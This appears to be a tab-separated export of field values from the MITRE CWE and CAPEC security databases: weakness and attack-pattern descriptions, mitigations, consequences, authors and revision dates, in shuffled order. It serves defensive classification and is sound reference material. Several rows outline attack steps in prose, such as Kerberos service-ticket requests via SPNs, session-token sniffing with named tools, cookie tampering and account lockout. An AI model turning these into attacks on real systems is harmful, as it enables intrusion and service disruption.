5779	46	This issue can make the software perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.   While the interpretation of "large data table" and "large number of joins or sub-queries" may vary for each product or developer, CISQ recommends a default of 1 million rows for a "large" data table, a default minimum of 5 joins, and a default minimum of 3 sub-queries.
14491	35	Cigital
18713	46	While many modern file systems or devices utilize some form of access control in order to restrict access to data, not all storage mechanisms have this capability. For example, memory cards, floppy disks, CDs, and USB devices are typically made accessible to any user within the system. This can become a problem when sensitive data is stored in these mechanisms in a multi-user environment, because anybody on the system can read or write this data.             On Android devices, external storage is typically globally readable and writable by other applications on the device. External storage may also be easily accessible through the mobile device's USB connection or physically accessible through the device's memory card port.
24498	62	updated Relationships, Taxonomy_Mappings
11726	28	CWE Content Team
6474	100	The MITRE Corporation
11141	28	CWE Content Team
23276	35	MITRE
25095	31	699
11789	62	updated Relationships
12145	23	Web Logs Tampering attacks involve an attacker injecting, deleting or otherwise tampering with the contents of web logs typically for the purposes of masking other malicious behavior. Additionally, writing malicious data to log files may target jobs, filters, reports, and other agents that process the logs in an asynchronous attack pattern. This pattern of attack is similar to "Log Injection-Tampering-Forging" except that in this case, the attack is targeting the logs of the web server and not the application.
13323	85	120
8159	40	Influence over the deployed system at a victim location.
7608	26	Implementation
12367	68	Note that this can be bypassed using XSS (CWE-79).
13264	62	updated Alternate_Terms, Relationships
24950	28	CWE Content Team
7224	53	The MITRE Corporation
20195	39	2015-12-07
15875	78	Low
20535	73	Collect social information via dumpster diving. See also: CAPEC-406.
18632	42	To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.
19280	23	The software uses multiple resources that can have the same identifier, in a context in which unique identifiers are required.
14870	28	CWE Content Team
5912	56	ChildOf
23379	63	Modify Memory
6859	68	The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.
21790	76	2018-07-31
9252	31	699
8272	70	RFC768 - User Datagram Protocol
20145	51	2014-06-23
6055	42	Carefully check each input parameter against a rigorous positive specification (whitelist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including tag attributes, hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.
9354	42	Follow the principle of least privilege when assigning access rights to entities in a software system.                   Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file. Ensure good compartmentalization in the system to provide protected areas that can be trusted.
24861	28	CWE Content Team
8250	78	Low
23312	62	updated Related_Attack_Patterns, Relationships
8117	62	updated Description
5962	72	An attacker could gain access to or modify sensitive data or system resources. This could allow access to protected files or directories including configuration files and files containing sensitive information.
10814	43	Simple
12066	100	The MITRE Corporation
22074	102	ChildOf
21867	62	updated Time_of_Introduction
25210	63	Reduce Maintainability
21924	77	Black Box
12596	35	MITRE
23322	73	Binary file extraction. The attacker extracts binary files from zips, jars, wars, PDFs or other composite formats.
21961	47	Other
13009	35	MITRE
19986	31	699
12743	35	MITRE
23475	86	http://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf
12563	28	CWE Content Team
7681	39	2012-05-11
14288	90	Java
7316	101	CAPEC Content Team
5845	39	2010-02-16
14531	35	Veracode
11891	56	ChildOf
22762	26	Architecture and Design
22835	35	MITRE
22415	28	CWE Content Team
20201	62	updated Relationships
17704	62	updated Relationships, Taxonomy_Mappings
7552	43	Simple
11415	62	updated Observed_Examples, Potential_Mitigations
17215	28	CWE Content Team
21545	26	Implementation
19520	59	Updated Activation_Zone, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact
18442	23	In this attack pattern, the adversary sends disruptive signals at a target satellite using a rogue uplink station to disrupt the intended transmission. Those within the satellite's footprint are prevented from reaching the satellite's targeted or neighboring channels. The satellite's footprint size depends upon its position in the sky; higher orbital satellites cover multiple continents.
9654	97	Restful Privilege Elevation
16813	62	updated Time_of_Introduction
22057	61	Draft
23109	68	This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application.
23134	79	Availability
20617	35	MITRE
22729	56	ChildOf
10289	35	MITRE
19275	63	Reduce Reliability
13177	28	KDM Analytics
21821	95	[Lock Out Accounts] Perform lockout procedure for all accounts that the attacker wants to lock out.
13353	35	MITRE
21540	78	Very High
24714	81	Availability
7287	25	High
18908	76	2017-05-01
9164	39	2014-07-30
22490	35	MITRE
21622	28	CWE Content Team
5674	35	MITRE
17385	25	Medium
13759	52	Automated black box tools that supply URLs to every input may be able to spot Location header modifications, but test case coverage is a factor, and custom redirects may not be detected.
23549	45	Base
13382	91	Implementation
12117	62	updated Modes_of_Introduction, Relationships
15399	66	Top 25 Series - Rank 21 - Incorrect Permission Assignment for Critical Response
20042	30	Eric Hacker
19544	44	SOAR Partial
20040	88	Behavioral Change in New Version or Environment
23885	73	Using user account's SPN value, request other service tickets from Active Directory
21185	21	PLOVER
16072	28	CWE Content Team
19041	50	Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.
9344	35	MITRE
21966	35	MITRE
20074	45	Variant
8486	97	Inter-component Protocol Manipulation
12462	79	Non-Repudiation
16485	56	CanPrecede
15577	96	2018-07-02
25341	26	Implementation
6876	50	Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as SQL content. Keywords such as UNION, SELECT or INSERT must be filtered in addition to characters such as a single-quote(') or SQL-comments (--) based on the context in which they appear.
8966	40	The ability to send an ICMP type 17 query (Address Mask Request) to a remote target and receive an ICMP type 18 message (ICMP Address Mask Reply) in response. Generally, modern operating systems will ignore ICMP type 17 messages, however, routers will commonly respond to this request.
12777	100	The MITRE Corporation
24940	45	Class
7779	101	CAPEC Content Team
9080	35	MITRE
9870	39	2010-02-16
12455	35	MITRE
10797	35	MITRE
24320	56	CanPrecede
7660	48	09
11796	46	Limited resources include memory, file system storage, database connection pool entries, and CPU. If an attacker can trigger the allocation of these limited resources, but the number or size of the resources is not controlled, then the attacker could cause a denial of service that consumes all available resources. This would prevent valid users from accessing the software, and it could potentially have an impact on the surrounding environment. For example, a memory exhaustion attack against an application could slow down the application as well as its host operating system.             There are at least three distinct scenarios which can commonly lead to resource exhaustion:                                                Lack of throttling for the number of allocated recources                   Losing all references to a resource before reaching the shutdown stage                   Not closing/returning resource after processing                                          Resource exhaustion problems are often result due to an incorrect implementation of the following situations:                                                Error conditions and other exceptional circumstances.                   Confusion over which part of the program is responsible for releasing the resource.
22237	62	Suggested OWASP Top Ten 2004 mapping
8167	39	2008-07-01
6712	28	CWE Content Team
13708	81	Other
22623	57	Primary
8182	42	Construct HTTP headers very carefully, avoiding the use of non-validated input data.
8250	97	Application Footprinting
13707	31	1000
11249	63	Read Memory
10150	31	1003
24674	62	updated Relationships, Taxonomy_Mappings
5977	25	High
19156	23	The software receives data from an upstream component, but only accounts for special elements at an absolute position (e.g. "byte number 10"), thereby missing remaining special elements that may exist before sending it to a downstream component.
13807	39	2017-11-08
14851	81	Availability
7300	32	Google
10326	92	Explore
8333	32	The Web Application Security Consortium (WASC)
20114	103	Primary
9890	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)                            Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Attack Modeling
13520	62	updated Relationships
11284	97	Block Logging to Central Repository
23303	63	Bypass Protection Mechanism
10139	23	The code contains a callable or other code grouping in which      the nesting / branching is too deep.
7254	39	2015-12-07
14973	91	Architecture and Design
17027	39	2009-07-27
10757	28	CWE Content Team
5887	28	CWE Content Team
6278	49	2008
12704	35	MITRE
22601	39	2014-07-30
9132	21	7 Pernicious Kingdoms
13207	104	167
20717	28	Eric Dalci
19543	91	Architecture and Design
13723	92	Exploit
6950	69	Draft
25109	28	CWE Content Team
10744	21	CWE Content Team
9580	81	Integrity
16781	86	http://cert.uni-stuttgart.de/archive/bugtraq/2002/11/msg00046.html
8415	62	updated Potential_Mitigations, Time_of_Introduction
19678	62	updated Relationships
23924	39	2019-01-03
22030	35	MITRE
10793	56	ChildOf
18808	24	MITRE
20901	42	Properly validate user input. Reject data where appropriate, filter where appropriate and escape where appropriate. Make sure input that will be used in XQL queries is safe in that context.
19439	74	3
8067	21	CLASP
15283	89	Detailed
10160	63	Alter Execution Logic
20103	79	Confidentiality
10684	24	MITRE
17863	62	updated Relationships, Taxonomy_Mappings
22847	28	CWE Content Team
22111	76	2017-08-04
18798	103	Primary
9871	39	2008-09-08
9818	76	2018-07-31
6236	62	updated Common_Consequences
9822	91	Implementation
20488	59	Updated Related_Attack_Patterns
11058	28	CWE Content Team
24903	35	MITRE
6011	23	A backup file is stored in a directory that is accessible to actors outside of the intended control sphere.
19477	39	2017-11-08
17728	88	Function Call with Incorrectly Specified Arguments
9722	26	Implementation
5847	28	CWE Content Team
6177	31	1000
5703	78	Medium
15964	63	Modify Memory
6758	26	Implementation
14684	56	ChildOf
7394	31	1000
24095	28	CWE Content Team
21562	33	Michael Gegick
24849	42	In general, do not allow user-provided or otherwise untrusted data to control sensitive values. The leverage that an attacker gains by controlling these values is not always immediately obvious, but do not underestimate the creativity of the attacker.
12158	35	MITRE
13282	91	Architecture and Design
10496	73	Modify cookie bitwise and send it back to server to observe the effects.
17866	62	updated Relationships
6646	86	https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223
17378	78	Low
23358	63	Read Files or Directories
21844	28	Eric Dalci
12917	44	High
18402	62	updated Relationships
22439	62	updated Common_Consequences
13006	63	Bypass Protection Mechanism
15610	45	Base
6691	88	Incorrect Privilege Assignment
23197	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
15636	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
24153	62	updated Common_Consequences
15802	35	MITRE
17300	62	updated Relationships, Taxonomy_Mappings
17325	62	updated Description
17830	28	CWE Content Team
17801	31	1000
5730	25	High
18900	50	Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier, a new one is issued when the level of privilege changes.
23825	62	updated Relationships
17114	78	High
8851	46	Attackers can use widely-available tools to view the cookie and read the sensitive information. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.
18883	100	The MITRE Corporation
22680	70	Host Discovery with Nmap
6616	35	MITRE
23819	39	2017-11-08
6162	35	MITRE
11372	81	Other
21457	62	updated Relationships, Taxonomy_Mappings
11417	42	The DTD or schema validation will not catch the duplicate occurrence of the same form name. To find the issue in the implementation, manual checks or automated static analysis could be applied to the xml configuration files.
6835	62	updated Demonstrative_Examples, Taxonomy_Mappings
18614	94	An adversary capable of successfully collecting and analyzing sensitive, fault/side-channel information, he or she has compromised the confidentiality of that application or information system data.
19160	62	updated Relationships
12099	30	Eddie Sutton
17427	28	CWE Content Team
15961	39	2019-06-20
7755	62	updated Potential_Mitigations, Time_of_Introduction
22540	99	SANS Software Security Institute
10858	104	150
21129	88	Double Free
14672	50	Implementation: Hide HTTP response header software information filed.
10739	101	CAPEC Content Team
6872	43	Simple
18470	39	2019-09-19
18450	30	L. Masinter
13687	96	2018-07-02
24133	23	The software uses a transmission protocol that does not include a mechanism for verifying the integrity of the data during transmission, such as a checksum.
15275	63	Read Files or Directories
10680	63	Bypass Protection Mechanism
23690	62	updated Relationships, Taxonomy_Mappings
25046	28	CWE Content Team
9474	62	updated Common_Consequences
12339	88	Deletion of Data Structure Sentinel
12843	39	2009-12-28
15632	35	MITRE
7532	35	MITRE
19529	101	CAPEC Content Team
12902	39	2019-01-03
6996	21	CWE Content Team
16276	91	Requirements
22727	28	CWE Content Team
12728	73	The attacker uses a network sniffer tool like ferret or hamster to monitor the wireless traffic at a WiFi hotspot while examining it for evidence of transmittal of session tokens in unencrypted or recognizably encrypted form. An attacker applies his knowledge of the manner by which session tokens are generated and transmitted by various target systems to identify the session tokens.
10840	35	MITRE
14470	86	https://en.wikipedia.org/wiki/Samy_(computer_worm)
9918	62	updated Other_Notes, Potential_Mitigations, Relationship_Notes
23350	76	2017-05-01
9888	104	761
15172	62	updated References, Terminology_Notes
5669	56	ChildOf
16660	39	2010-09-27
6350	62	updated Common_Consequences
13176	39	2019-06-20
11498	35	MITRE
11288	31	1003
6565	56	ChildOf
8928	40	Access to the client/server stream.
25378	56	ChildOf
17653	28	CWE Content Team
18320	62	updated Related_Attack_Patterns, Relationships
24238	35	MITRE
23123	100	The MITRE Corporation
10934	90	Language-Independent
5593	28	CWE Content Team
9045	39	2015-12-07
17407	45	Base
8042	28	CWE Content Team
10086	63	Gain Privileges or Assume Identity
20040	90	Language-Independent
15626	78	High
20987	28	CWE Content Team
12242	39	2019-01-03
6682	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
22446	39	2011-06-01
8124	31	1000
12495	28	CWE Content Team
16486	28	CWE Content Team
17442	35	MITRE
16964	62	updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships
18002	81	Other
25030	92	Explore
12156	103	Primary
8095	39	2014-06-23
12182	35	MITRE
16134	62	updated Type
13313	85	603
10942	28	CWE Content Team
21067	62	updated Relationships
8832	28	CWE Content Team
9067	72	The application may handle responses from untrusted applications on the device, which could cause it to perform unexpected or unauthorized actions.
14677	69	Incomplete
17642	28	CWE Content Team
5642	28	CWE Content Team
19745	63	Read Files or Directories
10089	69	Incomplete
14923	63	Bypass Protection Mechanism
22573	91	System Configuration
13011	21	Landwehr
21525	55	CAPEC Content Team
16380	28	CWE Content Team
24616	28	CWE Content Team
7124	56	ChildOf
8225	72	The exploitation of a weakness in low-privileged areas of the software can be leveraged to reach higher-privileged areas without having to overcome any additional obstacles.
24437	63	DoS: Resource Consumption (CPU)
17068	56	PeerOf
9752	23	The software uses or specifies an encoding when generating output to a downstream component, but the specified encoding is not the same as the encoding that is expected by the downstream component.
24247	60	08
23409	39	2011-06-01
15750	50	Design: Employ strict adherence to interpretations of HTTP messages wherever possible.
25292	39	2012-05-11
25067	43	Simple
21602	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, References, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
9707	103	Primary
7367	23	The software uses a name or reference to access a resource, but the name/reference resolves to a resource that is outside of the intended control sphere.
22769	103	Primary
18390	40	None
19441	47	Read Data
18906	31	699
13850	86	http://www.ietf.org/rfc/rfc0793.txt
17762	62	updated Relationships
17308	56	ChildOf
22940	67	Medium
8468	39	2009-03-10
19750	50	Perform validation on the server side to make sure that client side data tokens are consistent with what is expected.
7083	103	Primary
14746	96	2010-01-15
13114	80	Execution of arbitrary code
22854	35	MITRE
15898	90	Language-Independent
19968	43	Simple
24525	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
24919	51	2014-06-23
13488	39	2017-11-08
24335	39	2014-07-30
16558	76	2015-11-09
8424	62	updated Demonstrative_Examples, Relationships
25278	46	This weakness can be security-relevant when an attacker can influence the state of the resource between check and use. This can happen with shared resources such as files, memory, or even variables in multithreaded programs.
18216	69	Incomplete
22330	42	This issue can be simply combated with the use of proper build process.
22387	28	CWE Content Team
19796	31	699
18356	50	Implementation: Use indirect references rather than actual file names.
14279	35	MITRE
12388	62	updated Relationships, Taxonomy_Mappings
10028	62	updated Demonstrative_Examples, Observed_Examples, Relationships
17846	96	2011-05-24
17295	39	2012-05-11
21542	31	1000
17975	53	The MITRE Corporation
10433	35	MITRE
16398	23	The software calls a function, procedure, or routine, but the caller specifies an argument that is the wrong data type, which may lead to resultant weaknesses.
22845	28	CWE Content Team
10187	62	updated Common_Consequences
23676	35	Cigital
16331	28	CWE Content Team
16203	28	CWE Content Team
11352	39	2013-06-23
24911	90	Language-Independent
16375	28	CWE Content Team
12676	56	ChildOf
12175	50	Design: Static code analysis
12901	63	Bypass Protection Mechanism
6927	39	2011-06-27
7409	101	CAPEC Content Team
12198	35	MITRE
15427	102	ChildOf
13009	28	CWE Content Team
22348	77	Automated Static Analysis - Binary or Bytecode
15774	97	Symlink Attack
17963	101	CAPEC Content Team
21666	45	Base
22910	62	updated Related_Attack_Patterns
19433	35	MITRE
15234	39	2011-03-29
18060	56	ChildOf
5896	28	CWE Content Team
11193	45	Class
10350	35	MITRE
6746	63	Read Files or Directories
7298	53	The MITRE Corporation
14053	62	updated Taxonomy_Mappings
9029	81	Availability
15265	39	2008-09-08
18666	62	updated Relationships, Taxonomy_Mappings
20796	88	Sensitive Cookie in HTTPS Session Without 'Secure' Attribute
21213	90	Language-Independent
14678	81	Availability
19738	28	CWE Content Team
11963	26	Implementation
21186	39	2011-06-01
19892	35	MITRE
5865	50	Implementation: remove debug information.
13465	62	updated Potential_Mitigations
17446	35	MITRE
11886	78	Very High
12399	62	updated Potential_Mitigations
11532	62	updated Relationships
15928	81	Availability
21133	104	342
24886	39	2008-09-08
5632	35	MITRE
19020	63	Execute Unauthorized Code or Commands
11451	28	CWE Content Team
19407	39	2018-03-27
18959	31	1000
16301	76	2017-08-04
15228	62	updated Relationships
10195	62	updated Common_Consequences
13293	67	Low
13842	23	The elevated privilege level required to perform operations such as chroot() should be dropped immediately after the operation is performed.
16913	49	2011
10532	28	CWE Content Team
5605	31	699
5754	69	Incomplete
17311	81	Availability
14813	35	MITRE
22144	74	1
17548	56	ChildOf
14591	45	Base
9998	35	MITRE
14517	72	If the cryptographic algorithm is used for authentication and authorization, then an attacker could gain unauthorized access to the system.
21447	39	2009-07-27
7313	35	MITRE
9178	28	CWE Content Team
21634	28	CWE Content Team
7145	39	2018-03-27
22286	40	The targeted API must ignore the leading ghost characters that are used to get past the filters for the semantics to be the same.
9351	39	2019-06-20
22685	28	CWE Content Team
15105	53	The MITRE Corporation
20729	91	Architecture and Design
12638	39	2014-06-23
8370	95	[Find systems susceptible to the attack] Find systems that contain functionality that is accessed from both the internet zone and the local zone. There needs to be a way to supply input to that functionality from the internet zone and that original input needs to be used later on a page from a local zone.
13726	77	Manual Static Analysis
24216	62	updated Description, Relationships, Taxonomy_Mappings
11760	39	2009-03-10
8862	35	MITRE
9541	42	Only call matching memory management functions. Do not mix and match routines. For example, when you allocate a buffer with malloc(), dispose of the original pointer with free().
22838	39	2011-06-01
18648	62	updated Common_Consequences
15977	26	Implementation
14387	67	High
10947	104	1052
6073	35	MITRE
12397	91	Testing
15370	62	updated Common_Consequences
8010	91	Implementation
11341	31	699
10415	35	MITRE
19544	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Manual Source Code Review (not inspections)
13079	39	2018-03-27
23890	28	CWE Content Team
24285	28	CWE Content Team
5761	35	MITRE
20461	62	updated Relationships
12487	28	CWE Content Team
17906	56	CanPrecede
10046	85	55
11043	28	CWE Content Team
19481	28	CWE Content Team
20165	103	Primary
17061	35	MITRE
21816	62	updated Relationships
21550	35	MITRE
15244	62	updated Potential_Mitigations
19030	62	updated Relationships
16767	35	MITRE
23738	90	Language-Independent
12134	28	Eric Dalci
23039	42	Clearly identify the scope for all critical data elements, including whether they should be regarded as static.
19218	79	Integrity
10679	91	Operation
20677	91	Architecture and Design
17337	48	06
7223	88	Missing XML Validation
24554	28	CWE Content Team
6736	39	2017-11-08
24365	35	MITRE
24340	101	CAPEC Content Team
9418	101	CAPEC Content Team
9585	49	2010
17978	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
23772	71	2009
23384	63	Bypass Protection Mechanism
10469	103	Primary
16489	103	Primary
24786	35	MITRE
8236	28	CWE Content Team
9576	50	Monitor connections, checking headers in traffic for contradictory domain names, or empty domain names.
5733	23	The software generates a web page, but does not neutralize or incorrectly neutralizes user-controllable input that could be interpreted as a server-side include (SSI) directive.
9984	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
18298	39	2008-09-08
20774	63	Alter Execution Logic
8341	28	CWE Content Team
24464	56	ChildOf
7635	100	The MITRE Corporation
14469	39	2009-05-27
11454	62	updated Relationships, Taxonomy_Mappings
20845	104	470
11136	86	https://isocpp.org/wiki/faq/freestore-mgmt#delete-this
23727	88	Multiple Binds to the Same Port
7558	62	updated Time_of_Introduction
22473	81	Availability
11639	39	2017-11-08
12550	28	CWE Content Team
7966	31	699
17972	21	PLOVER
12368	21	PLOVER
24573	31	1000
11964	77	Manual Static Analysis - Binary or Bytecode
7285	31	1000
17887	76	2019-04-04
14083	28	CWE Content Team
22139	48	03
21092	97	TCP Connect Scan
22407	102	ChildOf
7141	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
20016	51	2014-06-23
21773	39	2017-01-19
18263	35	MITRE
24255	62	updated Relationships
18694	31	1000
23682	104	918
13321	56	ChildOf
10974	69	Incomplete
8397	50	Monitor system and domain logs for abnormal access.
7393	90	C
24061	62	updated Relationships
17866	28	CWE Content Team
16933	47	Execute Unauthorized Commands
25066	35	MITRE
6755	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
12010	35	MITRE
11193	57	Indirect
10504	102	CanPrecede
21037	90	C
23642	21	PLOVER
11155	35	MITRE
6519	79	Confidentiality
8611	39	2009-05-27
19763	46	Such a scenario is commonly observed when:                             1. A web application authenticates a user without first invalidating the existing session, thereby continuing to use the session already associated with the user.                2. An attacker is able to force a known session identifier on a user so that, once the user authenticates, the attacker has access to the authenticated session.                3. The application or container uses predictable session identifiers. In the generic exploit of session fixation vulnerabilities, an attacker creates a new session on a web application and records the associated session identifier. The attacker then causes the victim to associate, and possibly authenticate, against the server using that session identifier, giving the attacker access to the user's account through the active session.
22224	86	http://www.piotrbania.com/all/articles/ewdd.pdf
10011	88	Use of a Key Past its Expiration Date
11217	92	Explore
20243	47	Modify Data
18613	46	When software is operating in a concurrent environment and repeatedly unlocks a critical resource, the consequences will vary based on the type of lock, the lock's implementation, and the resource being protected. In some situations such as with semaphores, the resources are pooled and extra calls to unlock will increase the count for the number of available resources, likely resulting in a crash or unpredictable behavior when the system nears capacity.
6671	76	2019-09-30
14772	39	2012-05-11
8556	62	updated Potential_Mitigations
15505	28	CWE Content Team
5765	62	updated Relationships
8065	59	Updated Attacker_Skills_or_Knowledge_Required, Related_Attack_Patterns, Type (Attack_Pattern -> Relationship)
14279	62	updated Relationships, Taxonomy_Mappings
19149	35	MITRE
5679	90	Language-Independent
15343	39	2012-05-11
15728	35	MITRE
13365	28	CWE Content Team
17803	78	Very High
24609	27	None: No specialized resources are required to execute this type of attack.
22575	56	ChildOf
17721	35	MITRE
18450	30	M. McCahill
19682	76	2017-01-09
25015	35	MITRE
11017	42	Generate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330). [REF-332]
24781	62	updated References, Relationships, Taxonomy_Mappings
21249	35	MITRE
11535	81	Availability
8815	39	2010-02-16
11627	62	updated Relationships, Taxonomy_Mappings
12175	89	Detailed
22140	97	Forced Integer Overflow
11729	28	CWE Content Team
15007	48	04
18376	79	Authorization
17209	47	Read Data
21815	28	CWE Content Team
20595	35	Cigital
15718	35	MITRE
7973	62	updated Relationships
13363	28	CWE Content Team
18840	35	MITRE
16678	59	Updated Description Summary
6322	46	If an attacker modifies the variable to contain unexpected values, this could violate assumptions from other parts of the code. Additionally, if an attacker can read the private variable, it may expose sensitive information or make it easier to launch further attacks.
8795	39	2014-07-30
16299	101	CAPEC Content Team
21591	28	CWE Content Team
19506	30	Watchfire Research
24519	39	2008-09-08
23787	28	CWE Content Team
21862	31	1000
15408	62	updated Potential_Mitigations, References
20318	45	Base
10844	28	CWE Content Team
14094	35	MITRE
14704	90	Language-Independent
17250	35	Cigital
18553	89	Meta
22947	35	MITRE
15418	39	2017-11-08
22057	50	Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.
21468	101	CAPEC Content Team
11221	62	updated Potential_Mitigations
8681	35	MITRE
16521	100	The MITRE Corporation
9350	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
8868	28	CWE Content Team
9293	79	Authorization
11295	91	Architecture and Design
7016	62	updated Applicable_Platforms, Enabling_Factors_for_Exploitation, Modes_of_Introduction, References, Relationships
18668	28	CWE Content Team
14918	47	Read Data
9234	79	Access Control
6407	42	Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.                   Identify all inputs that are used for security decisions and determine if you can modify the design so that you do not have to rely on submitted inputs at all. For example, you may be able to keep critical information about the user's session on the server side instead of recording it within external data.
17199	35	MITRE
21260	39	2017-11-08
24992	49	2007
11822	101	CAPEC Content Team
15949	78	High
15784	35	MITRE
16610	62	updated Modes_of_Introduction, Relationships
14736	81	Integrity
18220	35	MITRE
13027	28	CWE Content Team
12116	62	updated Potential_Mitigations
9256	31	1000
6331	28	Eric Dalci
14703	51	2014-06-23
7593	103	Primary
10046	38	This is a completely offline attack that an attacker can perform at their leisure after the password hashes are obtained.
20687	101	CAPEC Content Team
12242	35	MITRE
6038	35	MITRE
10755	48	09
15405	39	2017-11-08
16697	50	Enforce regular patching of software.
19956	63	Other
24435	27	The adversary must have the resources to modify the targeted cache. In addition, in most cases the adversary will wish to host the sites to which users will be redirected, although in some cases redirecting to a third party site will accomplish the adversary's goals.
11375	76	2018-07-31
18594	28	CWE Content Team
21251	100	The MITRE Corporation
16620	39	2008-11-24
24970	84	02
16668	39	2009-05-27
14695	23	The software writes to a buffer using an index or pointer that references a memory location prior to the beginning of the buffer.
8730	35	MITRE
6678	26	Implementation
11295	42	Ensure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor [REF-7].
7066	39	2011-03-29
7945	62	updated Description, Name, Relationships
19281	39	2011-06-01
9990	39	2019-06-20
11645	40	User-controllable input not properly sanitized before being used as part of XPath queries
11132	35	MITRE
16675	47	Unreliable Execution
8782	97	Infrastructure Manipulation
18500	28	CWE Content Team
19583	86	http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dncode/html/secure10102002.asp
19189	28	CWE Content Team
17050	39	2008-09-08
6952	88	Improper Neutralization of Multiple Trailing Special Elements
21053	80	To inject a bogus node in the XML routing table
7306	90	Language-Independent
18989	82	3.2
8790	104	1071
25102	39	2008-07-01
14134	103	Primary
7015	28	CWE Content Team
20045	23	In this attack scenario, the attacker passively listens for WiFi management frame messages containing the Service Set Identifier (SSID) for the WiFi network. These messages are frequently transmitted by WiFi access points (e.g., the retransmission device) as well as by clients that are accessing the network (e.g., the handset/mobile device). Once the attacker is able to associate an SSID with a particular user or set of users (for example, when attending a public event), the attacker can then scan for this SSID to track that user in the future.
17291	31	1000
13840	62	updated Potential_Mitigations
17300	28	CWE Content Team
22130	62	updated Potential_Mitigations, Time_of_Introduction
18635	56	ChildOf
18013	56	ChildOf
23876	81	Integrity
7247	28	CWE Content Team
8888	39	2010-02-16
9348	100	The MITRE Corporation
23139	62	updated Applicable_Platforms
11033	55	CAPEC Content Team
14710	39	2011-03-29
8230	100	The MITRE Corporation
7746	39	2010-06-21
18401	62	added/updated white box definitions
24651	33	Vitaly Shmatikov
17184	91	Architecture and Design
16748	95	Determine user-controllable parameters of the application
20981	28	CWE Content Team
7930	28	CWE Content Team
9639	62	updated Name
23211	28	CWE Content Team
7412	93	Defense in Depth
23689	88	Improper Neutralization of Leading Special Elements
10818	28	CWE Content Team
22414	56	CanPrecede
12344	71	2013
24418	103	Primary
13669	28	CWE Content Team
21394	28	CWE Content Team
12211	35	MITRE
16435	25	Low
12422	88	Use of Web Link to Untrusted Target with window.opener Access
9700	62	updated Other_Notes, Relationship_Notes
11249	81	Confidentiality
6412	55	CAPEC Content Team
21680	61	Draft
19208	35	MITRE
9840	74	2
13109	60	26
22587	71	2009
17641	35	MITRE
7576	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit
17382	62	Suggested OWASP Top Ten 2004 mapping
6394	69	Draft
15539	35	MITRE
17485	28	CWE Content Team
8572	74	5
12982	35	MITRE
